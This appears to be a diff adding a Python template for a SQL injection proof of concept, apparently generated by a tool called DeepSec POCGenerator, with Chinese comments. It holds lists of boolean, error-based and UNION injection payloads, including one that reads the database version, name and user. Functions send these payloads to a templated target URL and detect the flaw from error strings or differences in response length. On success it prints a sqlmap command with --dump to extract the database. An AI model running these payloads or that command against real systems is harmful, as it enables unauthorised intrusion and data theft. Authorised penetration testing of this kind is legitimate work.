@@ -1,0 +1,130 @@
+#!/usr/bin/env python3
+"""
+SQL 注入 POC
+自动生成 by DeepSec POCGenerator
+漏洞类型: {{ vuln_type }}
+目标: {{ target_url }}
+参数: {{ parameter }}
+"""
+import requests
+import sys
+import urllib.parse
+
+TARGET = "{{ target_url }}"
+PARAMETER = "{{ parameter }}"
+PAYLOAD = "{{ payload }}"
+METHOD = "{{ method }}"
+COOKIE = "{{ cookie }}"
+
+# --- 常见 SQL 注入 payload ---
+BOOLEAN_PAYLOADS = [
+    "' AND 1=1--",
+    "' AND 1=2--",
+    "' OR '1'='1",
+    "\" AND 1=1--",
+    "\" AND 1=2--",
+]
+
+ERROR_PAYLOADS = [
+    "'",
+    "\"",
+    "')",
+    "\"))",
+    "'; --",
+]
+
+UNION_PAYLOADS = [
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "' UNION SELECT version(),database(),user()--",
+]
+
+
+def send_payload(payload):
+    """发送 SQL 注入 payload 并返回响应。"""
+    params = {PARAMETER: payload}
+    headers = {"Cookie": COOKIE} if COOKIE else {}
+
+    if METHOD.upper() == "POST":
+        resp = requests.post(TARGET, data=params, headers=headers, timeout=10)
+    else:
+        resp = requests.get(TARGET, params=params, headers=headers, timeout=10)
+
+    return {
+        "status": resp.status_code,
+        "length": len(resp.text),
+        "text": resp.text,
+    }
+
+
+def check_boolean_based():
+    """布尔盲注检测。"""
+    true_resp = send_payload("' AND 1=1--")
+    false_resp = send_payload("' AND 1=2--")
+
+    if true_resp["length"] != false_resp["length"]:
+        diff = abs(true_resp["length"] - false_resp["length"])
+        if diff > 10:
+            print(f"[+] 布尔盲注疑似存在 (长度差={diff})")
+            return True
+    return False
+
+
+def check_error_based():
+    """报错注入检测。"""
+    errors = [
+        "SQL syntax",
+        "mysql_fetch",
+        "ORA-01756",
+        "Microsoft SQL Server",
+        "PostgreSQL ERROR",
+        "SQLite3::query",
+        "Warning: mysql_",
+        "You have an error in your SQL syntax",
+    ]
+
+    for payload in ERROR_PAYLOADS:
+        resp = send_payload(payload)
+        for err in errors:
+            if err.lower() in resp["text"].lower():
+                print(f"[+] 报错注入确认: {err} (payload={payload})")
+                return True
+    return False
+
+
+def check_union_based():
+    """UNION 注入检测。"""
+    for payload in UNION_PAYLOADS:
+        resp = send_payload(payload)
+        if resp["status"] == 200 and len(resp["text"]) > 0:
+            # TODO: 检查是否有数据列数变化
+            pass
+    return False
+
+
+def extract_data():
+    """提取数据库数据。"""
+    # TODO: 实现数据提取逻辑
+    print("[*] 数据提取需 --dangerous 模式")
+    pass
+
+
+if __name__ == "__main__":
+    print(f"[*] SQL 注入 POC - {TARGET} param={PARAMETER}")
+    print(f"[*] 检测中...")
+
+    found = False
+    if check_error_based():
+        found = True
+        print("[+] 漏洞确认: 报错注入")
+    elif check_boolean_based():
+        found = True
+        print("[+] 漏洞确认: 布尔盲注")
+
+    if found:
+        print(f"\n[+] SQL 注入漏洞确认 @ {TARGET}")
+        print(f"[+] 参数: {PARAMETER}")
+        print(f"[+] 建议使用: sqlmap -u '{TARGET}' -p {PARAMETER} --batch --dump")
+    else:
+        print("[-] 未检测到 SQL 注入")
